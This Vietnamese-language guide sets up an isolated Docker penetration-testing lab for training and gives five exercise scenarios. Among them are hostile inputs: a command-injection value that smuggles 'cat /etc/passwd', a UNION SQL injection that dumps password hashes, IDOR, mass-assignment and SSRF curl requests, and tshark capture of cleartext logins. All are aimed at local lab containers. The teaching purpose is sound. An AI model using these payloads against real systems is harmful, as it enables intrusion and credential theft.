# HƯỚNG DẪN THIẾT LẬP VÀ VẬN HÀNH PHÒNG THỰC HÀNH (CYBERSECURITY LAB ENVIRONMENT)

> Tài liệu hướng dẫn thiết lập hạ tầng phòng lab thực hành kiểm thử an toàn thông tin (VAPT / Red Team / CEH v12) độc lập trên nền tảng Docker & Docker Compose.
>
> **Liên kết điều phối:** Xem [DIEU_PHOI_LO_TRINH_DOC.md](file:///mnt/second_drive/DOCS/SEC/DIEU_PHOI_LO_TRINH_DOC.md) | [02_Master_Lecture_and_Lab_Plan.md](file:///mnt/second_drive/DOCS/SEC/docs/Lectures/02_Master_Lecture_and_Lab_Plan.md) | [03_OWASP_Top_10_and_API_Security_DeepDive.md](file:///mnt/second_drive/DOCS/SEC/docs/References/03_OWASP_Top_10_and_API_Security_DeepDive.md).

---

## 1. TỔNG QUAN KIẾN TRÚC PHÒNG LAB

Phòng Lab được cô lập hoàn toàn trên dải mạng ảo riêng biệt `sec-lab-net` (`172.28.0.0/16`) nhằm đảm bảo tính an toàn, không rò rỉ lưu lượng tấn công ra ngoài mạng nội bộ của doanh nghiệp.

```
       +-------------------------------------------------------------+
       |                  Docker Host (Máy học viên)                 |
       |                                                             |
       |  Attacker CLI / Browser / Burp Suite / Nmap / Metasploit    |
       +------------------------------+------------------------------+
                                      |
                     [Isolated Bridge: sec-lab-net]
                             (172.28.0.0/16)
                                      |
       +------------------------------+------------------------------+
       |                              |                              |
       v                              v                              v
+---------------+             +---------------+             +---------------+
|     DVWA      |             |  Juice Shop   |             |Vulnerable API |
| 172.28.0.10   |             |  172.28.0.20  |             |  172.28.0.30  |
| Port: 8080:80 |             | Port: 3000    |             | Port: 5000    |
+---------------+             +---------------+             +---------------+
       |                              |                              |
       +------------------------------+------------------------------+
                                      |
       +------------------------------+------------------------------+
       |                                                             |
       v                                                             v
+-----------------------------+               +-----------------------------+
|     Metasploitable Node     |               |       Traffic Sniffer       |
|         172.28.0.40         |               |         172.28.0.50         |
| Ports: 2121, 2222, 8088     |               | Tools: tshark, tcpdump      |
+-----------------------------+               +-----------------------------+
```

---

## 2. BẢNG PHÂN BỔ ĐỊA CHỈ IP VÀ DỊCH VỤ

| Tên Container | Địa chỉ IP IPAM | Cổng Host (Mapped) | Dịch vụ & Công nghệ | Mục đích Đào tạo |
| :--- | :--- | :--- | :--- | :--- |
| **sec_lab_dvwa** | `172.28.0.10` | `8080:80` | PHP 7, Apache, MySQL | Web truyền thống: SQLi, XSS, Command Injection, File Upload |
| **sec_lab_juiceshop** | `172.28.0.20` | `3000:3000` | Node.js, Express, Angular | Web hiện đại: NoSQLi, Broken Auth, JWT, XSS DOM, Logic flaw |
| **sec_lab_vulnerable_api** | `172.28.0.30` | `5000:5000` | Python 3.11, Flask REST | OWASP API Top 10: BOLA/IDOR, Mass Assignment, BFLA, SSRF |
| **sec_lab_metasploitable** | `172.28.0.40` | `2121:21`, `2222:22`, `8088:80` | Linux, vsftpd, OpenSSH, Apache | Rà quét mạng, Enumeration dịch vụ, Brute force, Shell access |
| **sec_lab_sniffer** | `172.28.0.50` | `Internal` | Alpine Netshoot (tshark/tcpdump) | Bắt gói tin, Sniffing credential cleartext, Phân tích PCAP |

---

## 3. HƯỚNG DẪN VẬN HÀNH

### 3.1. Khởi động toàn bộ phòng Lab
Đứng tại thư mục gốc của repository, di chuyển vào thư mục `labs` và chạy:
```bash
cd /mnt/second_drive/DOCS/SEC/labs
docker-compose up -d
```
*Lưu ý: Đối với Docker v2, lệnh tương đương là `docker compose up -d`.*

### 3.2. Kiểm tra trạng thái các container
```bash
docker-compose ps
```

### 3.3. Kiểm tra tự động cấu hình Lab bằng Python
Trước khi khởi chạy thực tế, bạn có thể kiểm tra cú pháp và cấu hình với script tích hợp:
```bash
/usr/bin/python3.11 labs/scripts/verify_lab_config.py
```

### 3.4. Dừng và dọn dẹp môi trường Lab
```bash
cd /mnt/second_drive/DOCS/SEC/labs
docker-compose down
```

---

## 4. CHI TIẾT 5 KỊCH BẢN BÀI TẬP THỰC HÀNH CHUYÊN SÂU

### KỊCH BẢN 1: Web Pentest Truyền Thống trên DVWA (Port 8080)
- **Tài liệu lý thuyết:** [02_Master_Lecture_and_Lab_Plan.md#bài-giảng-14](file:///mnt/second_drive/DOCS/SEC/docs/Lectures/02_Master_Lecture_and_Lab_Plan.md), [Module 14 - Web Application Hacking.md](file:///mnt/second_drive/DOCS/SEC/CEH-Notes/Module%2014%20-%20Web%20Application%20Hacking.md).
- **Mục tiêu thực hành:**
  1. Đăng nhập DVWA (`http://localhost:8080`, tài khoản mặc định `admin` / `password`).
  2. Truy cập `DVWA Security`, chọn mức độ `Low`.
  3. Khai thác **Command Injection**:
     - Nhập IP: `127.0.0.1; cat /etc/passwd`
     - Phân tích nguyên nhân: Hàm `shell_exec()` gọi trực tiếp chuỗi từ người dùng mà không sanitize input.
  4. Khai thác **SQL Injection (Union-based)**:
     - Nhập ID: `1' UNION SELECT user, password FROM users #`
     - Dump toàn bộ hash mật khẩu của database.
  5. Đọc tài liệu tham khảo: [OWASP_Web_Security_Testing_Guide_WSTG_v4.2.pdf](file:///mnt/second_drive/DOCS/SEC/docs/References/External_Downloads/OWASP_Web_Security_Testing_Guide_WSTG_v4.2.pdf).

---

### KỊCH BẢN 2: Khai Thác OWASP API Top 10 trên Vulnerable REST API (Port 5000)
- **Tài liệu lý thuyết:** [03_OWASP_Top_10_and_API_Security_DeepDive.md](file:///mnt/second_drive/DOCS/SEC/docs/References/03_OWASP_Top_10_and_API_Security_DeepDive.md), [OWASP_API_Security_Top_10_Official.pdf](file:///mnt/second_drive/DOCS/SEC/docs/References/External_Downloads/OWASP_API_Security_Top_10_Official.pdf).
- **Mục tiêu thực hành:**
  1. **API2 - Broken Authentication & Brute Force:**
     - Endpoint: `POST http://localhost:5000/api/v1/auth/login`
     - Payload: `{"username": "alice", "password": "alice123"}`
     - Lấy JWT token trả về.
  2. **API1 - Broken Object Level Authorization (BOLA/IDOR):**
     - Đang đăng nhập dưới tư cách `alice` (ID: 1), gửi request đọc thông tin của quản trị viên (ID: 3):
       ```bash
       curl -X GET http://localhost:5000/api/v1/users/3
       ```
     - Kết quả: Server trả về email, số dư và quyền admin của user 3 mà không kiểm tra quyền sở hữu đối tượng.
  3. **API3 - Mass Assignment (Leo thang đặc quyền):**
     - Gửi PUT request cập nhật profile của chính mình nhưng chèn thêm cờ `is_admin`:
       ```bash
       curl -X PUT http://localhost:5000/api/v1/users/1 \
         -H "Content-Type: application/json" \
         -d '{"email": "alice_hacked@corp.local", "is_admin": true, "role": "administrator"}'
       ```
  4. **API7 - Server-Side Request Forgery (SSRF):**
     - Ép API server gửi request nội bộ tới container khác trong mạng:
       ```bash
       curl -X POST http://localhost:5000/api/v1/tools/fetch_url \
         -H "Content-Type: application/json" \
         -d '{"url": "http://172.28.0.10"}'
       ```

---

### KỊCH BẢN 3: Network Scanning & Service Enumeration trên Metasploitable Node
- **Tài liệu lý thuyết:** [02_Master_Lecture_and_Lab_Plan.md#bài-giảng-03-04](file:///mnt/second_drive/DOCS/SEC/docs/Lectures/02_Master_Lecture_and_Lab_Plan.md), [04_Network_Penetration_Testing_Cheatsheet.md](file:///mnt/second_drive/DOCS/SEC/docs/References/04_Network_Penetration_Testing_Cheatsheet.md).
- **Mục tiêu thực hành:**
  1. Quét phát hiện cổng mở và phiên bản dịch vụ:
     ```bash
     nmap -sS -sV -p 2121,2222,8088 127.0.0.1
     ```
  2. Quét với Nmap Vulnerability Script (NSE):
     ```bash
     nmap --script vuln -p 2121,2222,8088 127.0.0.1
     ```
  3. Kiểm tra thông tin tham khảo từ SANS: [SANS_TCPIP_Packet_CheatSheet_2021.pdf](file:///mnt/second_drive/DOCS/SEC/docs/References/External_Downloads/SANS_TCPIP_Packet_CheatSheet_2021.pdf).

---

### KỊCH BẢN 4: Traffic Sniffing & Phân Tích Gói Tin Bằng Tshark / Wireshark
- **Tài liệu lý thuyết:** [02_Master_Lecture_and_Lab_Plan.md#bài-giảng-08](file:///mnt/second_drive/DOCS/SEC/docs/Lectures/02_Master_Lecture_and_Lab_Plan.md), [Module 08 - Sniffing.md](file:///mnt/second_drive/DOCS/SEC/CEH-Notes/Module%2008%20-%20Sniffing.md).
- **Mục tiêu thực hành:**
  1. Đính kèm vào container `sec_lab_sniffer`:
     ```bash
     docker exec -it sec_lab_sniffer sh
     ```
  2. Bắt các gói tin HTTP cleartext và trích xuất thông tin đăng nhập:
     ```bash
     tshark -i eth0 -Y 'http.request.method == "POST"' -T fields -e http.file_data
     ```
  3. Đọc hướng dẫn cú pháp filter Wireshark: [Wireshark_Display_Filters_CheatSheet.pdf](file:///mnt/second_drive/DOCS/SEC/docs/References/External_Downloads/Wireshark_Display_Filters_CheatSheet.pdf).

---

### KỊCH BẢN 5: Viết Báo Cáo Đánh Giá VAPT Chuyên Nghiệp
- **Tài liệu chuẩn mực:** [06_NIST_SP_800-115_Technical_Guide.md](file:///mnt/second_drive/DOCS/SEC/docs/References/06_NIST_SP_800-115_Technical_Guide.md).
- **Mẫu báo cáo thực tế:** [Enterprise_VAPT_Report_NIST_SP800-115_Sample.docx](file:///mnt/second_drive/DOCS/SEC/docs/References/External_Downloads/Enterprise_VAPT_Report_NIST_SP800-115_Sample.docx) và [Enterprise_VAPT_Report_NIST_SP800-115_Sample.pdf](file:///mnt/second_drive/DOCS/SEC/docs/References/External_Downloads/Enterprise_VAPT_Report_NIST_SP800-115_Sample.pdf).
- **Mục tiêu thực hành:**
  - Tổng hợp các lỗ hổng tìm được ở 4 kịch bản trên vào bảng phân loại CVSS v3.1.
  - Viết phần Tóm tắt điều hành (Executive Summary) và Khuyến nghị kỹ thuật (Technical Remediation).
